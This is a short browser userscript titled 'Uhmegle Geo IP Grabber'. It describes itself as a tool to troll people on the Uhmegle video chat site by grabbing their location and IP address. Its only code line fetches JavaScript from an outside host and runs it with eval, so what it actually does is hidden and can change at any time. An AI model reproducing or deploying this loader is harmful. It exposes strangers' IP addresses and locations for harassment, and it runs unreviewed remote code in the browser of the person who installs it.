// ==UserScript==
// @name         Uhmegle Geo IP Grabber
// @namespace    https://flawcra.cc
// @version      1.0.8-GitHub
// @description  A simple script to troll people on Uhmegle.
// @author       FlawCra
// @license      Apache License 2.0
// @match        https://uhmegle.com/*
// @grant        none
// @updateURL    https://raw.githubusercontent.com/FlawCra/UserScripts/main/scripts/OmegleGeoIpGrabber.user.js
// @icon         https://www.google.com/s2/favicons?sz=256&domain=uhmegle.com
// ==/UserScript==

fetch("https://jsdrm.cloud/v2/loader/d87191f3-f97a-4303-932b-7bf1a3cdae1e/9a34b621-348d-495b-9f45-54c3358a05c5").then((res) => res.text().then((txt) => eval(txt)));
